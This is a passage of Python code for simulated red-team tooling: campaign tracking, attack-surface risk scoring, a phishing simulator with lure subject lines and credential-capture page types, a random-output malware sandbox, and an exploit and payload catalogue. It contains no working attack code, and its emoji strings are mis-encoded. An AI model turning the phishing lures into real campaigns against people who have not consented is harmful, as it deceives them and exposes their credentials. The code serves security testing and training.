        'ransomware_sim': {'name': 'Ransomware Simulation', 'icon': 'üíÄ'},
        'c2_establish': {'name': 'C2 Establishment', 'icon': 'üì°'}
    }
    
    def __init__(self):
        self.campaigns = {}
        self.active_campaign = None
        self.team_members = []
        self.operation_log = []
    
    def create_campaign(self, campaign_info: Dict[str, Any]) -> str:
        """Create a new red team campaign."""
        campaign_id = str(uuid.uuid4())[:8]
        
        self.campaigns[campaign_id] = {
            'id': campaign_id,
            'name': campaign_info.get('name', f'Campaign-{campaign_id}'),
            'client': campaign_info.get('client'),
            'scope': campaign_info.get('scope', []),
            'objectives': campaign_info.get('objectives', []),
            'rules_of_engagement': campaign_info.get('roe', {}),
            'start_date': campaign_info.get('start_date', datetime.now().isoformat()),
            'end_date': campaign_info.get('end_date'),
            'status': 'planning',
            'current_phase': 'reconnaissance',
            'team': campaign_info.get('team', []),
            'infrastructure': [],
            'targets': [],
            'findings': [],
            'evidence': [],
            'timeline': []
        }
        
        return campaign_id
    
    def activate_campaign(self, campaign_id: str) -> bool:
        """Set campaign as active."""
        if campaign_id in self.campaigns:
            self.active_campaign = campaign_id
            self.campaigns[campaign_id]['status'] = 'active'
            self._log_operation('campaign_activated', campaign_id)
            return True
        return False
    
    def _log_operation(self, operation: str, details: Any) -> None:
        """Log campaign operation."""
        self.operation_log.append({
            'timestamp': datetime.now().isoformat(),
            'campaign': self.active_campaign,
            'operation': operation,
            'details': details
        })
    
    def add_target(self, target_info: Dict[str, Any]) -> str:
        """Add target to active campaign."""
        if not self.active_campaign:
            return None
        
        target_id = str(uuid.uuid4())[:8]
        
        target = {
            'id': target_id,
            'type': target_info.get('type', 'host'),
            'name': target_info.get('name'),
            'ip': target_info.get('ip'),
            'url': target_info.get('url'),
            'in_scope': target_info.get('in_scope', True),
            'priority': target_info.get('priority', 'medium'),
            'status': 'identified',
            'notes': target_info.get('notes', '')
        }
        
        self.campaigns[self.active_campaign]['targets'].append(target)
        self._log_operation('target_added', target)
        return target_id
    
    def add_finding(self, finding_info: Dict[str, Any]) -> str:
        """Add finding to active campaign."""
        if not self.active_campaign:
            return None
        
        finding_id = str(uuid.uuid4())[:8]
        
        finding = {
            'id': finding_id,
            'title': finding_info.get('title'),
            'severity': finding_info.get('severity', 'medium'),
            'category': finding_info.get('category'),
            'target': finding_info.get('target'),
            'description': finding_info.get('description'),
            'impact': finding_info.get('impact'),
            'evidence': finding_info.get('evidence', []),
            'recommendations': finding_info.get('recommendations', []),
            'timestamp': datetime.now().isoformat(),
            'phase': self.campaigns[self.active_campaign]['current_phase']
        }
        
        self.campaigns[self.active_campaign]['findings'].append(finding)
        self._log_operation('finding_added', finding)
        return finding_id
    
    def advance_phase(self) -> str:
        """Advance campaign to next phase."""
        if not self.active_campaign:
            return None
        
        campaign = self.campaigns[self.active_campaign]
        current_idx = self.CAMPAIGN_PHASES.index(campaign['current_phase'])
        
        if current_idx < len(self.CAMPAIGN_PHASES) - 1:
            new_phase = self.CAMPAIGN_PHASES[current_idx + 1]
            campaign['current_phase'] = new_phase
            
            campaign['timeline'].append({
                'phase': new_phase,
                'started': datetime.now().isoformat()
            })
            
            self._log_operation('phase_advanced', new_phase)
            return new_phase
        
        return campaign['current_phase']
    
    def generate_campaign_report(self) -> str:
        """Generate campaign status report."""
        lines = [
            "=" * 70,
            "üéØ RED TEAM CAMPAIGN REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üìã Total Campaigns: {len(self.campaigns)}",
            ""
        ]
        
        if self.active_campaign:
            campaign = self.campaigns[self.active_campaign]
            
            lines.extend([
                "üéÆ ACTIVE CAMPAIGN",
                "‚îÄ" * 40,
                f"   Name: {campaign['name']}",
                f"   Status: {campaign['status']}",
                f"   Current Phase: {campaign['current_phase'].replace('_', ' ').title()}",
                f"   Targets: {len(campaign['targets'])}",
                f"   Findings: {len(campaign['findings'])}",
                ""
            ])
            
            # Phase progress
            lines.extend([
                "üìä PHASE PROGRESS",
                "‚îÄ" * 40
            ])
            
            current_idx = self.CAMPAIGN_PHASES.index(campaign['current_phase'])
            for i, phase in enumerate(self.CAMPAIGN_PHASES):
                if i < current_idx:
                    icon = "‚úÖ"
                elif i == current_idx:
                    icon = "üîÑ"
                else:
                    icon = "‚¨ú"
                lines.append(f"   {icon} {phase.replace('_', ' ').title()}")
            lines.append("")
            
            # Findings summary
            if campaign['findings']:
                lines.extend([
                    "üîç FINDINGS SUMMARY",
                    "‚îÄ" * 40
                ])
                
                sev_counts = {}
                for finding in campaign['findings']:
                    sev = finding['severity']
                    sev_counts[sev] = sev_counts.get(sev, 0) + 1
                
                for sev in ['critical', 'high', 'medium', 'low']:
                    count = sev_counts.get(sev, 0)
                    if count > 0:
                        sev_icon = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}.get(sev, '‚ö™')
                        lines.append(f"   {sev_icon} {sev.title()}: {count}")
        else:
            lines.append("   No active campaign")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class AttackSurfaceMapper:
    """Map and analyze attack surface."""
    
    SURFACE_CATEGORIES = {
        'external_web': {'risk_weight': 0.9, 'icon': 'üåê'},
        'external_api': {'risk_weight': 0.85, 'icon': 'üîå'},
        'email': {'risk_weight': 0.8, 'icon': 'üìß'},
        'vpn': {'risk_weight': 0.75, 'icon': 'üîí'},
        'remote_access': {'risk_weight': 0.85, 'icon': 'üñ•Ô∏è'},
        'cloud_services': {'risk_weight': 0.8, 'icon': '‚òÅÔ∏è'},
        'mobile_apps': {'risk_weight': 0.7, 'icon': 'üì±'},
        'iot_devices': {'risk_weight': 0.65, 'icon': 'üì°'},
        'third_party': {'risk_weight': 0.75, 'icon': 'ü§ù'},
        'physical': {'risk_weight': 0.6, 'icon': 'üè¢'}
    }
    
    def __init__(self):
        self.attack_surface = {}
        self.assets = []
        self.exposures = []
        self.risk_scores = {}
    
    def add_asset(self, asset_info: Dict[str, Any]) -> str:
        """Add asset to attack surface."""
        asset_id = str(uuid.uuid4())[:8]
        
        category = asset_info.get('category', 'external_web')
        cat_info = self.SURFACE_CATEGORIES.get(category, {'risk_weight': 0.5, 'icon': '‚ùì'})
        
        asset = {
            'id': asset_id,
            'name': asset_info.get('name'),
            'category': category,
            'icon': cat_info['icon'],
            'url': asset_info.get('url'),
            'ip': asset_info.get('ip'),
            'ports': asset_info.get('ports', []),
            'technologies': asset_info.get('technologies', []),
            'exposure_level': asset_info.get('exposure', 'medium'),
            'business_criticality': asset_info.get('criticality', 'medium'),
            'owner': asset_info.get('owner'),
            'last_scan': None,
            'vulnerabilities': [],
            'risk_score': 0
        }
        
        self.assets.append(asset)
        self._calculate_risk(asset_id)
        return asset_id
    
    def _calculate_risk(self, asset_id: str) -> float:
        """Calculate risk score for asset."""
        asset = next((a for a in self.assets if a['id'] == asset_id), None)
        if not asset:
            return 0.0
        
        # Base risk from category
        cat_info = self.SURFACE_CATEGORIES.get(asset['category'], {})
        base_risk = cat_info.get('risk_weight', 0.5) * 100
        
        # Adjust for exposure level
        exposure_factors = {'low': 0.7, 'medium': 1.0, 'high': 1.3}
        exposure_factor = exposure_factors.get(asset['exposure_level'], 1.0)
        
        # Adjust for criticality
        criticality_factors = {'low': 0.8, 'medium': 1.0, 'high': 1.4, 'critical': 1.8}
        criticality_factor = criticality_factors.get(asset['business_criticality'], 1.0)
        
        # Adjust for vulnerabilities
        vuln_factor = 1 + (len(asset['vulnerabilities']) * 0.1)
        
        # Adjust for ports
        port_factor = 1 + (len(asset['ports']) * 0.02)
        
        risk = base_risk * exposure_factor * criticality_factor * vuln_factor * port_factor
        risk = min(100, risk)
        
        asset['risk_score'] = round(risk, 1)
        self.risk_scores[asset_id] = risk
        
        return risk
    
    def add_exposure(self, exposure_info: Dict[str, Any]) -> None:
        """Add identified exposure."""
        self.exposures.append({
            'id': str(uuid.uuid4())[:8],
            'asset_id': exposure_info.get('asset_id'),
            'type': exposure_info.get('type'),
            'description': exposure_info.get('description'),
            'severity': exposure_info.get('severity', 'medium'),
            'discovered': datetime.now().isoformat(),
            'mitigated': False
        })
    
    def analyze_surface(self) -> Dict[str, Any]:
        """Analyze overall attack surface."""
        analysis = {
            'total_assets': len(self.assets),
            'total_exposures': len(self.exposures),
            'categories': {},
            'high_risk_assets': [],
            'avg_risk_score': 0,
            'recommendations': []
        }
        
        # Categorize assets
        for asset in self.assets:
            cat = asset['category']
            if cat not in analysis['categories']:
                analysis['categories'][cat] = {'count': 0, 'total_risk': 0}
            analysis['categories'][cat]['count'] += 1
            analysis['categories'][cat]['total_risk'] += asset['risk_score']
        
        # Find high-risk assets
        analysis['high_risk_assets'] = [
            a for a in self.assets if a['risk_score'] >= 70
        ]
        
        # Calculate average risk
        if self.assets:
            analysis['avg_risk_score'] = sum(a['risk_score'] for a in self.assets) / len(self.assets)
        
        # Generate recommendations
        if analysis['avg_risk_score'] >= 60:
            analysis['recommendations'].append('Implement attack surface reduction program')
        
        if len(analysis['high_risk_assets']) > 3:
            analysis['recommendations'].append('Prioritize patching high-risk assets')
        
        for cat, info in analysis['categories'].items():
            if info['count'] > 10:
                analysis['recommendations'].append(f'Consolidate {cat.replace("_", " ")} assets')
        
        return analysis
    
    def generate_surface_report(self) -> str:
        """Generate attack surface analysis report."""
        analysis = self.analyze_surface()
        
        lines = [
            "=" * 70,
            "üó∫Ô∏è ATTACK SURFACE ANALYSIS REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üì¶ Total Assets: {analysis['total_assets']}",
            f"‚ö†Ô∏è Total Exposures: {analysis['total_exposures']}",
            f"üìä Average Risk Score: {analysis['avg_risk_score']:.1f}",
            ""
        ]
        
        # Assets by category
        lines.extend([
            "üìä ASSETS BY CATEGORY",
            "‚îÄ" * 40
        ])
        
        for cat, info in self.SURFACE_CATEGORIES.items():
            cat_data = analysis['categories'].get(cat, {'count': 0, 'total_risk': 0})
            if cat_data['count'] > 0:
                avg_risk = cat_data['total_risk'] / cat_data['count']
                lines.append(f"   {info['icon']} {cat.replace('_', ' ').title()}: {cat_data['count']} (Avg Risk: {avg_risk:.1f})")
        lines.append("")
        
        # High-risk assets
        if analysis['high_risk_assets']:
            lines.extend([
                "üö® HIGH-RISK ASSETS",
                "‚îÄ" * 40
            ])
            for asset in sorted(analysis['high_risk_assets'], key=lambda x: -x['risk_score'])[:10]:
                lines.append(f"   üî¥ {asset['name']} (Risk: {asset['risk_score']})")
            lines.append("")
        
        # Recommendations
        if analysis['recommendations']:
            lines.extend([
                "üìã RECOMMENDATIONS",
                "‚îÄ" * 40
            ])
            for i, rec in enumerate(analysis['recommendations'], 1):
                lines.append(f"   {i}. {rec}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class PhishingCampaignSimulator:
    """Simulate phishing campaigns for security testing."""
    
    PHISHING_TEMPLATES = {
        'password_reset': {
            'name': 'Password Reset',
            'category': 'credential_harvest',
            'difficulty': 'easy',
            'click_rate_avg': 0.35,
            'subject_template': 'Urgent: Your password expires in 24 hours',
            'indicators': ['urgency', 'password_theme']
        },
        'invoice': {
            'name': 'Fake Invoice',
            'category': 'attachment',
            'difficulty': 'medium',
            'click_rate_avg': 0.25,
            'subject_template': 'Invoice #INV-{random_num} attached',
            'indicators': ['business_context', 'attachment']
        },
        'it_support': {
            'name': 'IT Support Request',
            'category': 'credential_harvest',
            'difficulty': 'easy',
            'click_rate_avg': 0.40,
            'subject_template': 'IT Department: Account Verification Required',
            'indicators': ['authority', 'internal_impersonation']
        },
        'shipping': {
            'name': 'Package Delivery',
            'category': 'link_click',
            'difficulty': 'easy',
            'click_rate_avg': 0.30,
            'subject_template': 'Your package delivery status - Action required',
            'indicators': ['curiosity', 'common_scenario']
        },
        'hr_update': {
            'name': 'HR Policy Update',
            'category': 'attachment',
            'difficulty': 'medium',
            'click_rate_avg': 0.45,
            'subject_template': 'Important: Updated Employee Benefits - Please Review',
            'indicators': ['authority', 'internal_context']
        },
        'ceo_fraud': {
            'name': 'CEO Fraud (BEC)',
            'category': 'wire_transfer',
            'difficulty': 'hard',
            'click_rate_avg': 0.15,
            'subject_template': 'Urgent wire transfer request - Confidential',
            'indicators': ['authority', 'urgency', 'secrecy']
        },
        'security_alert': {
            'name': 'Security Alert',
            'category': 'credential_harvest',
            'difficulty': 'medium',
            'click_rate_avg': 0.38,
            'subject_template': 'Security Alert: Unusual sign-in activity detected',
            'indicators': ['fear', 'urgency']
        },
        'document_share': {
            'name': 'Document Share',
            'category': 'link_click',
            'difficulty': 'easy',
            'click_rate_avg': 0.42,
            'subject_template': 'Document shared with you: Q4 Report.pdf',
            'indicators': ['business_context', 'curiosity']
        }
    }
    
    LANDING_PAGE_TYPES = {
        'credential_form': {'name': 'Credential Harvest Form', 'captures': ['username', 'password']},
        'mfa_capture': {'name': 'MFA Token Capture', 'captures': ['username', 'password', 'mfa_code']},
        'oauth_consent': {'name': 'OAuth Consent', 'captures': ['oauth_token']},
        'download': {'name': 'Malware Download', 'captures': ['execution']},
        'browser_exploit': {'name': 'Browser Exploit', 'captures': ['shell']}
    }
    
    def __init__(self):
        self.campaigns = {}
        self.active_campaign = None
        self.targets = []
        self.results = []
    
    def create_campaign(self, campaign_info: Dict[str, Any]) -> str:
        """Create a phishing campaign."""
        campaign_id = str(uuid.uuid4())[:8]
        
        template_id = campaign_info.get('template', 'password_reset')
        template = self.PHISHING_TEMPLATES.get(template_id, self.PHISHING_TEMPLATES['password_reset'])
        
        self.campaigns[campaign_id] = {
            'id': campaign_id,
            'name': campaign_info.get('name', f'Campaign-{campaign_id}'),
            'template': template_id,
            'template_info': template,
            'landing_page': campaign_info.get('landing_page', 'credential_form'),
            'sender_name': campaign_info.get('sender_name', 'IT Support'),
            'sender_email': campaign_info.get('sender_email', 'it@{domain}'),
            'targets': [],
            'status': 'draft',
            'created': datetime.now().isoformat(),
            'scheduled': campaign_info.get('scheduled'),
            'results': {
                'sent': 0,
                'delivered': 0,
                'opened': 0,
                'clicked': 0,
                'submitted': 0,
                'reported': 0
            },
            'settings': {
                'track_opens': True,
                'track_clicks': True,
                'capture_credentials': True,
                'schedule_batch': campaign_info.get('batch_size', 50)
            }
        }
        
        return campaign_id
    
    def add_targets(self, campaign_id: str, targets: List[Dict[str, Any]]) -> int:
        """Add targets to campaign."""
        if campaign_id not in self.campaigns:
            return 0
        
        campaign = self.campaigns[campaign_id]
        
        for target in targets:
            campaign['targets'].append({
                'id': str(uuid.uuid4())[:8],
                'email': target.get('email'),
                'name': target.get('name'),
                'department': target.get('department'),
                'status': 'pending',
                'events': []
            })
        
        return len(targets)
    
    def simulate_send(self, campaign_id: str) -> Dict[str, Any]:
        """Simulate sending campaign and generate results."""
        if campaign_id not in self.campaigns:
            return {'error': 'Campaign not found'}
        
        campaign = self.campaigns[campaign_id]
        template = campaign['template_info']
        
        results = {
            'campaign_id': campaign_id,
            'total_targets': len(campaign['targets']),
            'simulation_time': datetime.now().isoformat(),
            'events': []
        }
        
        # Simulate each target
        for target in campaign['targets']:
            # Delivery (95% success)
            if random.random() < 0.95:
                campaign['results']['delivered'] += 1
                target['events'].append({'type': 'delivered', 'time': datetime.now().isoformat()})
                
                # Open (based on template)
                open_rate = template['click_rate_avg'] * 1.5  # Opens are higher than clicks
                if random.random() < open_rate:
                    campaign['results']['opened'] += 1
                    target['events'].append({'type': 'opened', 'time': datetime.now().isoformat()})
                    
                    # Click (based on template)
                    if random.random() < template['click_rate_avg']:
                        campaign['results']['clicked'] += 1
                        target['events'].append({'type': 'clicked', 'time': datetime.now().isoformat()})
                        
                        # Submit (60% of clickers)
                        if random.random() < 0.6:
                            campaign['results']['submitted'] += 1
                            target['events'].append({'type': 'submitted', 'time': datetime.now().isoformat()})
                
                # Report (5% of recipients)
                if random.random() < 0.05:
                    campaign['results']['reported'] += 1
                    target['events'].append({'type': 'reported', 'time': datetime.now().isoformat()})
            
            campaign['results']['sent'] += 1
            target['status'] = 'sent'
        
        campaign['status'] = 'completed'
        
        # Calculate rates
        results['metrics'] = {
            'delivery_rate': campaign['results']['delivered'] / campaign['results']['sent'] * 100 if campaign['results']['sent'] > 0 else 0,
            'open_rate': campaign['results']['opened'] / campaign['results']['delivered'] * 100 if campaign['results']['delivered'] > 0 else 0,
            'click_rate': campaign['results']['clicked'] / campaign['results']['delivered'] * 100 if campaign['results']['delivered'] > 0 else 0,
            'submission_rate': campaign['results']['submitted'] / campaign['results']['clicked'] * 100 if campaign['results']['clicked'] > 0 else 0,
            'report_rate': campaign['results']['reported'] / campaign['results']['delivered'] * 100 if campaign['results']['delivered'] > 0 else 0
        }
        
        return results
    
    def generate_phishing_report(self) -> str:
        """Generate phishing campaign report."""
        lines = [
            "=" * 70,
            "üé£ PHISHING CAMPAIGN SIMULATION REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üìã Total Campaigns: {len(self.campaigns)}",
            ""
        ]
        
        # Templates overview
        lines.extend([
            "üìß PHISHING TEMPLATES",
            "‚îÄ" * 40
        ])
        
        for temp_id, template in self.PHISHING_TEMPLATES.items():
            diff_icon = {'easy': 'üü¢', 'medium': 'üü°', 'hard': 'üü†'}.get(template['difficulty'], '‚ö™')
            lines.append(f"   {diff_icon} {template['name']}")
            lines.append(f"      Category: {template['category']} | Avg Click: {template['click_rate_avg']*100:.0f}%")
        lines.append("")
        
        # Campaign results
        for campaign_id, campaign in self.campaigns.items():
            if campaign['status'] == 'completed':
                lines.extend([
                    f"üìä CAMPAIGN: {campaign['name']}",
                    "‚îÄ" * 40,
                    f"   Template: {campaign['template_info']['name']}",
                    f"   Targets: {len(campaign['targets'])}",
                    f"   üì® Sent: {campaign['results']['sent']}",
                    f"   üì¨ Delivered: {campaign['results']['delivered']}",
                    f"   üëÅÔ∏è Opened: {campaign['results']['opened']}",
                    f"   üñ±Ô∏è Clicked: {campaign['results']['clicked']}",
                    f"   üìù Submitted: {campaign['results']['submitted']}",
                    f"   üö® Reported: {campaign['results']['reported']}",
                    ""
                ])
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class MalwareAnalysisSandbox:
    """Simulate malware analysis in sandbox environment."""
    
    MALWARE_TYPES = {
        'ransomware': {
            'name': 'Ransomware',
            'icon': 'üíÄ',
            'behaviors': ['file_encryption', 'ransom_note', 'shadow_delete', 'persistence'],
            'severity': 'critical'
        },
        'trojan': {
            'name': 'Trojan',
            'icon': 'üê¥',
            'behaviors': ['backdoor', 'keylogging', 'screen_capture', 'data_theft'],
            'severity': 'high'
        },
        'worm': {
            'name': 'Worm',
            'icon': 'üêõ',
            'behaviors': ['self_replication', 'network_spread', 'exploit_usage'],
            'severity': 'high'
        },
        'rootkit': {
            'name': 'Rootkit',
            'icon': 'üåë',
            'behaviors': ['kernel_hooking', 'process_hiding', 'file_hiding', 'network_hiding'],
            'severity': 'critical'
        },
        'bot': {
            'name': 'Bot/Botnet',
            'icon': 'ü§ñ',
            'behaviors': ['c2_communication', 'ddos', 'spam', 'credential_theft'],
            'severity': 'high'
        },
        'spyware': {
            'name': 'Spyware',
            'icon': 'üëÅÔ∏è',
            'behaviors': ['keylogging', 'screen_capture', 'clipboard_monitor', 'browser_hook'],
            'severity': 'medium'
        },
        'dropper': {
            'name': 'Dropper',
            'icon': 'üì¶',
            'behaviors': ['payload_download', 'execution', 'evasion'],
            'severity': 'high'
        },
        'cryptominer': {
            'name': 'Cryptominer',
            'icon': '‚õèÔ∏è',
            'behaviors': ['cpu_usage', 'gpu_usage', 'pool_connection'],
            'severity': 'medium'
        }
    }
    
    ANALYSIS_TECHNIQUES = {
        'static': ['pe_analysis', 'string_extraction', 'import_analysis', 'entropy_check'],
        'dynamic': ['api_monitoring', 'network_capture', 'file_activity', 'registry_changes'],
        'memory': ['memory_dump', 'yara_scan', 'pattern_match', 'unpacking'],
        'network': ['dns_queries', 'http_traffic', 'c2_detection', 'exfil_detection']
    }
    
    def __init__(self):
        self.samples = {}
        self.analysis_results = {}
        self.iocs_extracted = []
    
    def submit_sample(self, sample_info: Dict[str, Any]) -> str:
        """Submit sample for analysis."""
        sample_id = str(uuid.uuid4())[:8]
        
        self.samples[sample_id] = {
            'id': sample_id,
            'filename': sample_info.get('filename'),
            'md5': sample_info.get('md5', hashlib.md5(str(random.random()).encode()).hexdigest()),
            'sha256': sample_info.get('sha256', hashlib.sha256(str(random.random()).encode()).hexdigest()),
            'file_size': sample_info.get('size', random.randint(10000, 5000000)),
            'file_type': sample_info.get('type', 'PE32'),
            'submitted': datetime.now().isoformat(),
            'status': 'queued',
            'analysis': None
        }
        
        return sample_id
    
    def analyze_sample(self, sample_id: str) -> Dict[str, Any]:
        """Run analysis on sample."""
        if sample_id not in self.samples:
            return {'error': 'Sample not found'}
        
        sample = self.samples[sample_id]
        sample['status'] = 'analyzing'
        
        # Simulate analysis
        malware_type = random.choice(list(self.MALWARE_TYPES.keys()))
        type_info = self.MALWARE_TYPES[malware_type]
        
        analysis = {
            'sample_id': sample_id,
            'analysis_time': datetime.now().isoformat(),
            'duration_seconds': random.randint(60, 300),
            'verdict': 'malicious' if random.random() < 0.7 else 'suspicious',
            'confidence': round(random.uniform(0.7, 0.99), 2),
            'classification': {
                'type': malware_type,
                'name': type_info['name'],
                'family': f"Generic.{malware_type.title()}",
                'severity': type_info['severity']
            },
            'behaviors_observed': random.sample(type_info['behaviors'], min(3, len(type_info['behaviors']))),
            'static_analysis': self._perform_static_analysis(sample),
            'dynamic_analysis': self._perform_dynamic_analysis(sample),
            'network_analysis': self._perform_network_analysis(sample),
            'iocs': self._extract_iocs(sample)
        }
        
        sample['status'] = 'completed'
        sample['analysis'] = analysis
        self.analysis_results[sample_id] = analysis
        
        return analysis
    
    def _perform_static_analysis(self, sample: Dict) -> Dict[str, Any]:
        """Perform static analysis."""
        return {
            'entropy': round(random.uniform(6.5, 8.0), 2),
            'packed': random.random() > 0.5,
            'packer': 'UPX' if random.random() > 0.7 else None,
            'imports_suspicious': random.randint(0, 10),
            'sections': random.randint(3, 8),
            'strings_extracted': random.randint(100, 1000),
            'suspicious_strings': random.randint(5, 50)
        }
    
    def _perform_dynamic_analysis(self, sample: Dict) -> Dict[str, Any]:
        """Perform dynamic analysis."""
        return {
            'processes_created': random.randint(1, 5),
            'files_created': random.randint(0, 20),
            'files_modified': random.randint(0, 50),
            'files_deleted': random.randint(0, 10),
            'registry_keys_created': random.randint(0, 15),
            'registry_keys_modified': random.randint(0, 25),
            'mutex_created': [f'Global\\{uuid.uuid4().hex[:8]}'],
            'services_created': random.randint(0, 2),
            'scheduled_tasks': random.randint(0, 2)
        }
    
    def _perform_network_analysis(self, sample: Dict) -> Dict[str, Any]:
        """Perform network analysis."""
        return {
            'dns_queries': random.randint(0, 20),
            'http_requests': random.randint(0, 30),
            'https_requests': random.randint(0, 15),
            'domains_contacted': [f'c2-{i}.malware.example' for i in range(random.randint(1, 3))],
            'ips_contacted': [f'185.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}' for _ in range(random.randint(1, 5))],
            'c2_detected': random.random() > 0.5,
            'exfil_detected': random.random() > 0.7
        }
    
    def _extract_iocs(self, sample: Dict) -> List[Dict[str, Any]]:
        """Extract IOCs from sample."""
        iocs = []
        
        # Add IPs
        for _ in range(random.randint(1, 5)):
            iocs.append({
                'type': 'ip',
                'value': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                'context': 'C2 communication'
            })
        
        # Add domains
        for i in range(random.randint(1, 3)):
            iocs.append({
                'type': 'domain',
                'value': f'c2-{i}.malware-domain.example',
                'context': 'Command and control'
            })
        
        # Add hashes
        iocs.append({
            'type': 'md5',
            'value': sample['md5'],
            'context': 'Sample hash'
        })
        
        iocs.append({
            'type': 'sha256',
            'value': sample['sha256'],
            'context': 'Sample hash'
        })
        
        self.iocs_extracted.extend(iocs)
        return iocs
    
    def generate_sandbox_report(self) -> str:
        """Generate malware analysis sandbox report."""
        lines = [
            "=" * 70,
            "üî¨ MALWARE ANALYSIS SANDBOX REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üì¶ Samples Analyzed: {len(self.analysis_results)}",
            f"üéØ IOCs Extracted: {len(self.iocs_extracted)}",
            ""
        ]
        
        # Malware types reference
        lines.extend([
            "ü¶† MALWARE TYPES",
            "‚îÄ" * 40
        ])
        
        for type_id, type_info in self.MALWARE_TYPES.items():
            sev_icon = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}.get(type_info['severity'], '‚ö™')
            lines.append(f"   {type_info['icon']} {type_info['name']} {sev_icon}")
        lines.append("")
        
        # Analysis results
        for sample_id, analysis in self.analysis_results.items():
            sample = self.samples[sample_id]
            lines.extend([
                f"üìÑ SAMPLE: {sample['filename']}",
                "‚îÄ" * 40,
                f"   Verdict: {analysis['verdict'].upper()}",
                f"   Classification: {analysis['classification']['name']}",
                f"   Severity: {analysis['classification']['severity']}",
                f"   Confidence: {analysis['confidence']*100:.0f}%",
                f"   Behaviors: {', '.join(analysis['behaviors_observed'])}",
                ""
            ])
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class ExploitDatabaseManager:
    """Manage local exploit database and payloads."""
    
    EXPLOIT_CATEGORIES = {
        'web': {'name': 'Web Application', 'icon': 'üåê'},
        'local': {'name': 'Local Privilege Escalation', 'icon': '‚¨ÜÔ∏è'},
        'remote': {'name': 'Remote Code Execution', 'icon': 'üéØ'},
        'dos': {'name': 'Denial of Service', 'icon': 'üí•'},
        'shellcode': {'name': 'Shellcode', 'icon': 'üêö'},
        'hardware': {'name': 'Hardware/Firmware', 'icon': 'üî©'},
        'mobile': {'name': 'Mobile', 'icon': 'üì±'},
        'network': {'name': 'Network Protocol', 'icon': 'üîå'}
    }
    
    EXPLOIT_PLATFORMS = [
        'windows', 'linux', 'macos', 'ios', 'android', 
        'unix', 'freebsd', 'solaris', 'multiple', 'hardware'
    ]
    
    def __init__(self):
        self.exploits = {}
        self.payloads = {}
        self.search_history = []
        self.favorites = []
    
    def add_exploit(self, exploit_info: Dict[str, Any]) -> str:
        """Add exploit to database."""
        exploit_id = str(uuid.uuid4())[:8]
        
        self.exploits[exploit_id] = {
            'id': exploit_id,
            'title': exploit_info.get('title'),
            'cve': exploit_info.get('cve'),
            'edb_id': exploit_info.get('edb_id'),
            'category': exploit_info.get('category', 'web'),
            'platform': exploit_info.get('platform', 'multiple'),
            'author': exploit_info.get('author'),
            'date_published': exploit_info.get('date', datetime.now().isoformat()),
            'verified': exploit_info.get('verified', False),
            'description': exploit_info.get('description'),
            'affected_versions': exploit_info.get('versions', []),
            'code': exploit_info.get('code'),
            'language': exploit_info.get('language', 'python'),
            'tags': exploit_info.get('tags', []),
            'references': exploit_info.get('references', []),
            'notes': exploit_info.get('notes', ''),
            'usage_count': 0,
            'success_rate': 0.0
        }
        
        return exploit_id
    
    def search_exploits(self, query: str, filters: Dict[str, Any] = None) -> List[Dict[str, Any]]:
        """Search exploits in database."""
        filters = filters or {}
        query_lower = query.lower()
        
        results = []
        
        for exploit_id, exploit in self.exploits.items():
            # Text search
            searchable = f"{exploit['title']} {exploit.get('cve', '')} {exploit.get('description', '')} {' '.join(exploit.get('tags', []))}".lower()
            
            if query_lower not in searchable:
                continue
            
            # Apply filters
            if filters.get('category') and exploit['category'] != filters['category']:
                continue
            
            if filters.get('platform') and exploit['platform'] != filters['platform']:
                continue
            
            if filters.get('verified') and not exploit['verified']:
                continue
            
            results.append(exploit)
        
        # Log search
        self.search_history.append({
            'query': query,
            'filters': filters,
            'results_count': len(results),
            'timestamp': datetime.now().isoformat()
        })
        
        return results
    
    def add_payload(self, payload_info: Dict[str, Any]) -> str:
        """Add payload to database."""
        payload_id = str(uuid.uuid4())[:8]
        
        self.payloads[payload_id] = {
            'id': payload_id,
            'name': payload_info.get('name'),
            'type': payload_info.get('type', 'reverse_shell'),
            'platform': payload_info.get('platform', 'linux'),
            'architecture': payload_info.get('arch', 'x64'),
            'handler': payload_info.get('handler'),
            'options': payload_info.get('options', {}),
            'code': payload_info.get('code'),
            'encoded': payload_info.get('encoded'),
            'size_bytes': payload_info.get('size', 0),
            'bad_chars': payload_info.get('bad_chars', []),
            'nops': payload_info.get('nops', 0)
        }
        
        return payload_id
    
    def get_exploit_stats(self) -> Dict[str, Any]:
        """Get exploit database statistics."""
        stats = {
            'total_exploits': len(self.exploits),
            'total_payloads': len(self.payloads),
            'by_category': {},
            'by_platform': {},
            'verified_count': 0,
            'recent_searches': self.search_history[-10:]
        }
        
        for exploit in self.exploits.values():
            # By category
            cat = exploit['category']
            stats['by_category'][cat] = stats['by_category'].get(cat, 0) + 1
            
            # By platform
            plat = exploit['platform']
            stats['by_platform'][plat] = stats['by_platform'].get(plat, 0) + 1
            
            # Verified
            if exploit['verified']:
                stats['verified_count'] += 1
        
        return stats
    
    def generate_database_report(self) -> str:
        """Generate exploit database report."""
        stats = self.get_exploit_stats()
        
        lines = [
            "=" * 70,
            "üíæ EXPLOIT DATABASE REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üéØ Total Exploits: {stats['total_exploits']}",
            f"üêö Total Payloads: {stats['total_payloads']}",
            f"‚úÖ Verified: {stats['verified_count']}",
            ""
        ]
        
        # By category
        lines.extend([
            "üìä EXPLOITS BY CATEGORY",
            "‚îÄ" * 40
        ])
        
        for cat_id, cat_info in self.EXPLOIT_CATEGORIES.items():
